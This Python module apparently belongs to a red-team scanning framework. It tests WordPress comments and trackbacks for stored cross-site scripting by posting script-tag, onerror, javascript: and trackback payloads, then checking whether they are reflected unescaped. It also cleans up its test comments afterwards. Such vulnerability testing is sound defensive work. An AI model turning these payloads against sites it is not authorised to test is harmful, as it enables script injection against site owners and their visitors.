"""WordPress comment stored XSS tests.

Tests for cross-site scripting vulnerabilities in the WordPress
comment system via REST API and trackback endpoints, checking
whether payloads are stored and reflected without sanitization.
"""

import time
import json as _json

from redteam.base import Attack, AttackResult, Severity, Status


class CommentXSSAttack(Attack):
    name = "wordpress.comment_xss"
    category = "wordpress"
    severity = Severity.HIGH
    description = "Stored XSS via WordPress comment system"
    target_types = {"wordpress"}

    COMMENT_ENDPOINT = "/wp/v2/comments"
    TARGET_POST_ID = 1

    async def execute(self, client) -> list[AttackResult]:
        results = []
        results.extend(await self._comment_script_tag(client))
        results.extend(await self._comment_event_handler(client))
        results.extend(await self._comment_href_javascript(client))
        results.append(await self._trackback_injection(client))
        return results

    # ------------------------------------------------------------------
    # Helper: submit a comment and verify if payload is reflected
    # ------------------------------------------------------------------
    async def _submit_and_check(
        self,
        client,
        variant: str,
        payload: str,
        authenticated: bool,
    ) -> AttackResult:
        """Submit a comment with payload via REST API, then check if
        the payload appears unescaped in the response.

        Returns a single AttackResult.
        """
        comment_data = {
            "post": self.TARGET_POST_ID,
            "content": payload,
            "author_name": "RedTeam",
            "author_email": "redteam@test.com",
        }

        auth_label = "authenticated" if authenticated else "unauthenticated"

        # Submit the comment
        start = time.monotonic()
        try:
            status_code, body, headers = await client.rest_post(
                self.COMMENT_ENDPOINT,
                json_body=comment_data,
                authenticated=authenticated,
            )
            duration = (time.monotonic() - start) * 1000
        except Exception as e:
            return self._make_result(
                variant=f"{variant}_{auth_label}",
                status=Status.ERROR,
                evidence=str(e),
                details=f"Exception submitting {auth_label} comment",
            )

        # Comment rejected entirely
        if status_code not in (200, 201):
            return self._make_result(
                variant=f"{variant}_{auth_label}",
                status=Status.DEFENDED,
                evidence=f"Comment rejected (HTTP {status_code})",
                details=f"REST API rejected {auth_label} comment with XSS payload",
                request={"endpoint": self.COMMENT_ENDPOINT, "payload": payload, "auth": authenticated},
                response={"status": status_code, "body": body[:300]},
                duration_ms=duration,
            )

        # Try to extract the comment ID from response to fetch it back
        comment_id = None
        try:
            resp_data = _json.loads(body)
            comment_id = resp_data.get("id")
        except (ValueError, TypeError, AttributeError):
            pass

        # Check response body for unescaped payload
        payload_reflected = payload in body

        # If we got a comment ID, fetch it back to double-check
        if comment_id and not payload_reflected:
            try:
                fetch_status, fetch_body, _ = await client.rest_get(
                    f"{self.COMMENT_ENDPOINT}/{comment_id}",
                    authenticated=authenticated,
                )
                if fetch_status == 200:
                    payload_reflected = payload in fetch_body
                    body = fetch_body  # Use fetched body for evidence
            except Exception:
                pass

        if payload_reflected:
            status = Status.VULNERABLE
            evidence = (
                f"XSS payload stored and reflected unescaped in {auth_label} comment "
                f"(comment ID: {comment_id})"
            )
        else:
            status = Status.DEFENDED
            evidence = (
                f"Payload sanitized or escaped in {auth_label} comment response "
                f"(comment ID: {comment_id})"
            )

        return self._make_result(
            variant=f"{variant}_{auth_label}",
            status=status,
            evidence=evidence,
            details=(
                f"Submitted {auth_label} comment with XSS payload. "
                f"HTTP {status_code}, payload reflected: {payload_reflected}"
            ),
            request={
                "endpoint": self.COMMENT_ENDPOINT,
                "payload": payload,
                "authenticated": authenticated,
                "comment_id": comment_id,
            },
            response={"status": status_code, "body": body[:500]},
            duration_ms=duration,
        )

    # ------------------------------------------------------------------
    # Variant 1: <script> tag injection
    # ------------------------------------------------------------------
    async def _comment_script_tag(self, client) -> list[AttackResult]:
        """Submit comment with <script>alert('XSS')</script>.

        Tests both authenticated and unauthenticated submissions.
        VULNERABLE if payload found unescaped in response.
        """
        payload = "<script>alert('XSS')</script>"
        return [
            await self._submit_and_check(client, "comment_script_tag", payload, authenticated=True),
            await self._submit_and_check(client, "comment_script_tag", payload, authenticated=False),
        ]

    # ------------------------------------------------------------------
    # Variant 2: Event handler injection
    # ------------------------------------------------------------------
    async def _comment_event_handler(self, client) -> list[AttackResult]:
        """Submit comment with <img src=x onerror=alert(1)>.

        Tests event-handler-based XSS which bypasses some script tag filters.
        """
        payload = "<img src=x onerror=alert(1)>"
        return [
            await self._submit_and_check(client, "comment_event_handler", payload, authenticated=True),
            await self._submit_and_check(client, "comment_event_handler", payload, authenticated=False),
        ]

    # ------------------------------------------------------------------
    # Variant 3: javascript: URI in href
    # ------------------------------------------------------------------
    async def _comment_href_javascript(self, client) -> list[AttackResult]:
        """Submit comment with <a href="javascript:alert(1)">Click</a>.

        Tests javascript: protocol handler in anchor tags.
        """
        payload = '<a href="javascript:alert(1)">Click</a>'
        return [
            await self._submit_and_check(client, "comment_href_javascript", payload, authenticated=True),
            await self._submit_and_check(client, "comment_href_javascript", payload, authenticated=False),
        ]

    # ------------------------------------------------------------------
    # Variant 4: Trackback XSS injection
    # ------------------------------------------------------------------
    async def _trackback_injection(self, client) -> AttackResult:
        """POST to /wp-trackback.php with XSS in blog_name field.

        Trackbacks are an older WordPress feature that may lack
        modern sanitization.
        VULNERABLE if payload reflected unescaped.
        """
        trackback_path = "/wp-trackback.php"
        xss_payload = "<script>alert(1)</script>"
        form_data = {
            "url": "http://evil.com",
            "title": "Test",
            "blog_name": xss_payload,
            "excerpt": "test",
        }

        start = time.monotonic()
        try:
            status_code, body, headers = await client.post_form(
                trackback_path,
                form_data,
                authenticated=False,
            )
            duration = (time.monotonic() - start) * 1000
        except Exception as e:
            return self._make_result(
                variant="trackback_injection",
                status=Status.ERROR,
                evidence=str(e),
                details="Exception posting to wp-trackback.php",
            )

        # Trackback endpoint doesn't exist or is disabled
        if status_code in (403, 404, 405):
            return self._make_result(
                variant="trackback_injection",
                status=Status.DEFENDED,
                evidence=f"Trackback endpoint blocked (HTTP {status_code})",
                details="wp-trackback.php is disabled or not found",
                request={"path": trackback_path, "blog_name": xss_payload},
                response={"status": status_code, "body": body[:300]},
                duration_ms=duration,
            )

        # Check if the XSS payload is in the response unescaped
        payload_reflected = xss_payload in body

        # Also check if trackback was accepted (WordPress returns XML with <error>0</error>)
        trackback_accepted = "<error>0</error>" in body

        if payload_reflected:
            status = Status.VULNERABLE
            evidence = "XSS payload reflected unescaped in trackback response"
        elif trackback_accepted:
            # Accepted but payload was sanitized -- need to check stored version
            # Try to find the trackback as a comment via REST API
            stored_xss = False
            try:
                fetch_status, fetch_body, _ = await client.rest_get(
                    self.COMMENT_ENDPOINT,
                    params={"per_page": "5", "orderby": "date", "order": "desc"},
                    authenticated=True,
                )
                if fetch_status == 200 and xss_payload in fetch_body:
                    stored_xss = True
            except Exception:
                pass

            if stored_xss:
                status = Status.VULNERABLE
                evidence = "Trackback accepted and XSS payload stored unescaped in comments"
            else:
                status = Status.DEFENDED
                evidence = "Trackback accepted but payload was sanitized"
        else:
            status = Status.DEFENDED
            evidence = f"Trackback returned HTTP {status_code}, payload not reflected"

        return self._make_result(
            variant="trackback_injection",
            status=status,
            evidence=evidence,
            details=(
                f"POST to {trackback_path} with XSS in blog_name. "
                f"HTTP {status_code}, accepted: {trackback_accepted}, reflected: {payload_reflected}"
            ),
            request={"path": trackback_path, "blog_name": xss_payload},
            response={"status": status_code, "body": body[:400]},
            duration_ms=duration,
        )

    # ------------------------------------------------------------------
    # Cleanup: remove test comments
    # ------------------------------------------------------------------
    async def cleanup(self, client) -> None:
        """Attempt to delete any comments created during testing."""
        try:
            status_code, body, _ = await client.rest_get(
                self.COMMENT_ENDPOINT,
                params={
                    "per_page": "20",
                    "search": "RedTeam",
                    "orderby": "date",
                    "order": "desc",
                },
                authenticated=True,
            )
            if status_code != 200:
                return

            comments = _json.loads(body)
            for comment in comments:
                comment_id = comment.get("id")
                if comment_id:
                    await client.delete(
                        f"{client.rest_prefix}{self.COMMENT_ENDPOINT}/{comment_id}",
                        params={"force": "true"},
                    )
        except Exception:
            pass
